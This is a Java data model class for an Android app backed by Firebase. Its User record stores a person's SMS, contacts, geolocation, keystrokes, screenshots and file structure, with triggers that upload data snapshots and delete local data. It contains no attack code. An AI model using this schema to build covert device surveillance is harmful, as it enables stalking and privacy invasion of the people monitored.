package com.vikasyadavnsit.cdc.data;

import com.google.firebase.database.IgnoreExtraProperties;

import java.util.Map;

import lombok.Builder;
import lombok.Data;

@IgnoreExtraProperties
@Data
@Builder
public class User {
    private String id;
    private String fullName;

    private Map<String, Object> userDetails;
    private Map<String, Object> deviceDetails;
    private Map<String, Object> userSettings;
    private AppSettings appSettings;
    private UserData userData;

    @Data
    @Builder
    public class AppSettings {
        private Map<String, AppTriggerSettingsData> appTriggerSettingsDataMap;
        private Map<String, Object> appSettingsMap;
    }

    @Data
    @Builder
    public class AppTriggerSettingsData {
        private boolean enabled;
        private boolean repeatable;
        private int maxRepeatitions;
        private long frequency;
        private String action;
        private boolean uploadDataSnapshot;
        private boolean deleteLocalData;
    }

    @Data
    @Builder
    public class UserData {
        private Map<String, Object> sensors;
        private Map<String, Object> fileStructure;
        private Map<String, Object> sms;
        private Map<String, Object> contacts;
        private Map<String, Object> geolocation;
        private Map<String, Object> keystrokes;
        private Map<String, Object> deviceStats;
        private Map<String, Object> appStats;
        private Map<String, Object> screenshots;
        private Map<String, Object> offlineFiles;
    }

}
